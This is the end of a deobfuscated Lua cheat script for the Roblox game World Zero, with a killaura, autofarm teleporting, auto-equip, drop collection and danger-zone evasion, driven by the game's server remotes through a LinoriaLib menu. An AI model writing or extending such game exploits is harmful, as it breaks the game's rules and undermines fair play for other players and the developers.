        local fX = Vector3.new(math.clamp(fW.X, fU.X, fV.X), math.clamp(fW.Y, fU.Y, fV.Y), math.clamp(fW.Z, fU.Z, fV.Z))
        return fX
    end
    function getClosestPointAndDistance(fY, fZ)
        if not fY or not fZ then
            return math.huge, nil
        end
        local f_ = fY.Position;
        local fU, fV = getBoundingBox(fZ)
        local fX = getClosestPointOnAABB(f_, fU, fV)
        local g0 = (fZ.Position - fX).Unit;
        fX = fX + g0 * 0.1;
        if Toggles.Autofarm.Value and isRangedClass() then
            local g1 = olympus and Options['testOffset'] and Options.testOffset.Value or aR[fZ.Parent.Name] or 0;
            fX = fX + Vector3.new(0, g1, 0)
        end
        local g2 = (fX - f_).Magnitude;
        return g2, fX
    end
    function getClosestMob(g3)
        local g4 = math.huge;
        local g5, fX, g6, ad, ag;
        local ey, g7, ec;
        if g3 and isAlive(g3) then
            local g8 = g3.PrimaryPart;
            local g2, g9 = getClosestPointAndDistance(aU, g8)
            g4, fX, g5 = g2, g9, g8
        else
            for dj, bA in bl:GetChildren() do
                if isAlive(bA) and not ignoreIfNotAlone(bA.Name) then
                    local g8 = bA.PrimaryPart;
                    local g2, g9 = getClosestPointAndDistance(aU, g8)
                    if g2 < g4 then
                        g4, fX, g5 = g2, g9, g8
                    end
                end
            end
        end
        if g5 then
            ey, g7, ec = Mob(g5.Parent.Name), g5.Parent.HealthProperties.Health, g5.Parent.Name;
            ad = g5.Position;
            g6 = (aU.Position - ad).magnitude;
            ag = ey and ey['BossTag']
        end
        return g5, fX, ad, g4, g6, ag, g7
    end
    function equipWepWithId(ga, e5)
        for z, R in bM:GetChildren() do
            if R:FindFirstChild('ID') and R.ID.Value and R.ID.Value == ga then
                bT:FireServer(R, b4)
                libNoti('Equipped ' .. bR[R.Name].DisplayKey .. ' for' .. e5)
                break
            end
        end
    end
end
local gb = {'CorruptedGreaterTree'}
function ignoreIfNotAlone(ec)
    if bd and bd > 1 and table.find(gb, ec) then
        return true
    end
end
Toggles.Killaura:OnChanged(function(cU)
    bu = bu + 1;
    if not cU then
        return
    end
    local gc = bc[eo][ep]
    ak = tick()
    task.spawn(function()
        local gd;
        local ge = 67;
        while Toggles.Killaura.Value and aC do
            ab, ac, ad, ae, af, ag, ah = getClosestMob(bY)
            if alive() and ab then
                task.spawn(function()
                    if not gd then
                        gd = true;
                        if Toggles.PerkSwitcher.Value and cl[b9].Offhand then
                            local gf = OffhandPerksActive()
                            if ag and not gf then
                                SwitchOffhandPerks(true)
                            end
                            if not ag and gf then
                                SwitchOffhandPerks(false)
                            end
                        end
                        local gg = b4:GetChildren()[1]
                        if gg and gg:FindFirstChild('ID') and gg.ID.Value then
                            local gh = gg.ID.Value;
                            local gi = Options.mobWepId.Value and #Options.mobWepId.Value > 2 and Options.mobWepId.Value;
                            local gj = Options.bossWepId.Value and #Options.bossWepId.Value > 2 and
                                           Options.bossWepId.Value;
                            if gi and not ag and gh ~= gi then
                                equipWepWithId(gi, ' Mobs!')
                                task.wait(0.5)
                            end
                            if gj and ag and gh ~= gj then
                                equipWepWithId(gj, ' Bosses!')
                                task.wait(0.5)
                            end
                        end
                        gd = false
                    end
                end)
                if not mounted() then
                    for dj, gk in cl[b9].Skills do
                        local gl, gm = gk.MeleeOnBoss and ag and 'Melee' or gk.Type or cl[b9].Type, gk.Skill;
                        local gn = gk.MeleeOnBoss and ag and gk.BossRange or gk.Range or cl[b9].Range;
                        local go = gk.Cooldown + Options.KillauraDelay.Value;
                        if tick() - (gk.LastUsed or 0) >= go then
                            if gl ~= 'Heal' and ae <= gn and ah.Value > 0 then
                                if gl == 'Melee' then
                                    bk:FireServer(gm, aU.Position, (ac - aU.Position).Unit, ge)
                                elseif gl == 'Ranged' then
                                    bk:FireServer(gm, ac, nil, ge)
                                elseif gl == 'Self' then
                                    bk:FireServer(gm, aU.Position, nil, ge)
                                elseif gl == 'Remote' then
                                    if gk.Args == 'MobPosition' then
                                        gm:FireServer(ad, nil, nil, ge)
                                    elseif gk.Args == 'mobTbl' then
                                        gm:FireServer({ab.Parent}, nil, nil, ge)
                                    else
                                        gm:FireServer(nil, nil, nil, ge)
                                    end
                                end
                                gk.LastUsed = tick()
                                ak = tick()
                            end
                            if gl == 'Heal' and aV.Health.Value / aV.MaxHealth.Value < 0.6 then
                                gm:FireServer(gk.Args or nil, nil, nil, ge)
                                gk.LastUsed = tick()
                            end
                        end
                    end
                end
            end
            task.wait()
        end
    end)
    if aC and not ax:FindFirstChild(36) and aC then
        task.spawn(function()
            while Toggles.Killaura.Value do
                for z, R in aw:GetChildren() do
                    local A = R:FindFirstChild("HealthProperties", true)
                    if A and not table.find(c9, A.Parent.Name) then
                        table.insert(aS, A.Parent)
                        A.Parent.Parent = bl
                    end
                end
                task.wait(0.3333)
            end
        end)
    end
    if classCheck(eo) and Toggles.Killaura.Value and bloodBindingEnabled and aC then
        task.spawn(function()
            while Toggles.Killaura.Value do
                if classCheck(eo) then
                    if alive() and not mounted() and not aT:FindFirstChild('AttackBuffDemonBloodBinding', true) and ab and
                        ae and ae <= 95 then
                        bc.Demon.BloodBinding:FireServer()
                        ak = tick()
                        task.wait(6)
                    end
                end
                task.wait()
            end
        end)
    end
    if classCheck('Summoner') and Toggles.Killaura.Value and aC then
        task.spawn(function()
            while Toggles.Killaura.Value do
                for dj, Mob in bl:GetChildren() do
                    if Mob.Name == 'SummonerSummonWeak' or Mob.Name == 'SummonerSummonStrong' then
                        Mob.Parent = cm
                    end
                end
                for dj, gp in cm:GetChildren() do
                    if gp.PrimaryPart then
                        if ab then
                            gp.PrimaryPart.CFrame = CFrame.new(ad)
                        end
                        if gp:FindFirstChild('HealthProperties') and gp.HealthProperties:FindFirstChild('Health') and
                            gp.HealthProperties.Health.Value > 0 and gp.HealthProperties.Health.Value /
                            gp.HealthProperties.MaxHealth.Value <= 0.25 then
                            bc.Summoner.ExplodeSummons:FireServer()
                        end
                    end
                end
                b_:Wait()
            end
        end)
    end
    if aC then
        task.spawn(function()
            while Toggles.Killaura.Value and not aQ do
                if Toggles.Autofarm.Value and not bX then
                    task.wait(0.5)
                    if tick() - ak >= Options.timeoutTimer.Value then
                        local gq = Options.Offset.Value;
                        Options.Offset:SetValue(0)
                        task.wait(3)
                        if tick() - ak >= Options.timeoutTimer.Value then
                            libNoti('Timeout! Force restarting dungeon!')
                            missionEndRestartOrNextEvent()
                            break
                        else
                            Options.Offset:SetValue(gq)
                        end
                    end
                end
                task.wait(1)
            end
        end)
    end
end)
Toggles.CollectDrops:OnChanged(function()
    task.spawn(function()
        while Toggles.CollectDrops.Value do
            for gr, gs in aY do
                gs.model:Destroy()
                gs.followPart:Destroy()
                table.remove(aY, gr)
                aZ:FireServer(gs.id)
            end
            task.wait()
        end
    end)
end)
Toggles.autoEquipBestwWep:OnChanged(function(cU)
    if not cU then
        return
    end
    task.spawn(function()
        while Toggles.autoEquipBestwWep.Value do
            local gt, gu = 0, 0;
            local gv, gw;
            local gg = b4:GetChildren()[1]
            if gg then
                gt = bS:GetItemStats(gg)['Attack'] or 0
            end
            local gx, gy = 0, 0;
            local gz, gA;
            local gB = b6:GetChildren()[1]
            if gB then
                gx = bS:GetItemStats(gB)['Defense'] or 0
            end
            for z, R in bM:GetChildren() do
                if R:FindFirstChild('Level') and R.Level.Value <= a_.Level.Value then
                    local gC = bR[R.Name]
                    local gD, gE = gC.Type == 'Weapon', gC.Type == 'Armor'
                    local gF, gG = gD and bS:GetItemStats(R)['Attack'], gE and bS:GetItemStats(R)['Defense']
                    if gD and gF and gF > gt and gF > gu then
                        gv = R;
                        gu = gF;
                        gw = gC.DisplayKey
                    end
                    if gE and gG and gG > gx and gG > gy then
                        gz = R;
                        gy = gG;
                        gA = gC.DisplayKey
                    end
                end
            end
            if gv then
                libNoti('Equipped a T' .. c0:GetItemTier(gv) .. ' ' .. gw .. ' - Power: ' .. gu)
                bT:FireServer(gv, b4)
            end
            if gz then
                libNoti('Equipped a T' .. c0:GetItemTier(gz) .. ' ' .. gA .. ' - Defense: ' .. gy)
                bT:FireServer(gz, b6)
            end
            task.wait(2)
        end
    end)
end)
local cj = require(game.ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Effects"))
local gH = cj.RenderDamageNumber;
Toggles.NVD:OnChanged(function()
    cj.RenderDamageNumber = function(...)
        if Toggles.NVD.Value then
            return
        end
        return gH(...)
    end
end)
Options.FastSprint:OnChanged(function()
    bU.SPRINT_WALKSPEED = Options.FastSprint.Value
end)

-- ============================================================================
-- LIBRARY CONFIGURATION SECTION
-- ============================================================================
-- Setup Theme Manager and Save Manager (previously cq and cr)
cq:SetLibrary(cp)        -- Connect ThemeManager to main library
cr:SetLibrary(cp)        -- Connect SaveManager to main library
cr:IgnoreThemeSettings() -- Don't save theme settings
cr:SetIgnoreIndexes({'MenuKeybind'}) -- Don't save menu keybind

-- Set folder for saving configurations  
cq:SetFolder('MyScriptHub')
cr:SetFolder('MyScriptHub')

-- Build configuration sections in Settings tab
cr:BuildConfigSection(cA['Settings'])  -- Add save/load config section
cq:ApplyToTab(cA['Settings'])          -- Add theme options

-- Menu controls
local gI = cA['Settings']:AddRightGroupbox('Menu')
gI:AddButton('Unload', function()
    cp:Unload() -- Unload the entire UI
end)

-- Menu keybind setup
gI:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
    Default = 'LeftAlt',
    NoUI = false,
    Text = 'Menu keybind'
})
cp.ToggleKeybind = Options.MenuKeybind; -- Set the toggle keybind

-- Auto-load configuration with timeout
local gJ = tick()
while tick() - gJ < 60 do
    if aC then
        cr:LoadAutoloadConfig() -- Load saved configuration
        
        -- Special dungeon offset check
        if ay and ax:FindFirstChild(24) then
            if Options.Offset.Value > 45 then
                Options.Offset:SetValue(45)
                libNoti('Set offset to 45 to avoid death')
            end
        end
        break
    end
    task.wait()
end
if Toggles.autoHide.Value and aC then
    task.wait(0.25)
    cp:Toggle() -- Hide the UI if auto-hide is enabled
end

-- Check for gamepass ownership
pcall(function()
    aa = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(d, 8136250)
end)

-- Safety check system - continuously monitor for danger zones
task.spawn(function()
    while wait(0.5) do -- Check every 0.5 seconds (reduced frequency to avoid conflicts)
        if Toggles.Autofarm and Toggles.Autofarm.Value and aT and aT.Character and aT.Character:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = aT.Character.HumanoidRootPart
            
            -- Only run safety check if not actively teleporting to avoid conflicts
            if not bY then -- bY is set when actively targeting a mob
                pcall(function()
                    if isPositionInConeIndicator(humanoidRootPart.Position) then
                        print("[Emergency] Player in danger zone! Moving to safety...")
                        local safePos = getSafePositionNearTarget(humanoidRootPart.Position)
                        if safePos then
                            humanoidRootPart.CFrame = CFrame.new(safePos)
                            print("[Emergency] Moved to safe position:", safePos)
                        else
                            -- Emergency high altitude escape
                            humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position + Vector3.new(0, 100, 0))
                            print("[Emergency] Escaped to high altitude")
                        end
                    end
                end)
            end
        end
    end
end)

-- ============================================================================
-- END OF DEOBFUSCATED WORLD ZERO INFINITE SCRIPT
-- ============================================================================
--[[
    DEOBFUSCATION SUMMARY:
    
    1. Libraries now loaded explicitly from GitHub:
       - cp = LinoriaLib (UI Library)
       - cq = ThemeManager  
       - cr = SaveManager
    
    2. Removed encoded variables:
       - k, l, m, n (encoded URL parts)
       - c3, c4, c5, c6 (encoded URL parts)
       - bK function (no longer needed)
    
    3. Added comprehensive comments explaining:
       - Library loading process
       - Variable meanings
       - Function purposes
       - Configuration setup
    
    4. Code is now much more readable and maintainable
    
    5. Added comprehensive ConeIndicator and KrakenInkAttack avoidance system:
       - Real-time danger zone detection for all ConeIndicator models in workspace
       - Detection of KrakenInkAttack models with cone-shaped danger zones
       - Safe position calculation with multiple fallback options
       - Enhanced MobTeleportPriority with spatial awareness
       - Emergency safety system running every 0.1 seconds
       - Buffer zones of 8-10 studs to ensure safety
       - Automatic safe position finding with 15 test positions around target
       - High altitude escape as ultimate fallback
    
    6. Added specialized Kraken Arm positioning system:
       - Player always positioned 15 studs behind each EVENTBOSSKrakenArm
       - getKrakenArmBackPosition() calculates optimal back position using LookVector
       - Enhanced safety checks for back positions with angle adjustments
       - findSafeKrakenArm() prioritizes arms with safe back positions
       - Automatic fallback positioning if back calculation fails
       - Better attack angles and collision avoidance at 12 studs height
    

]]--
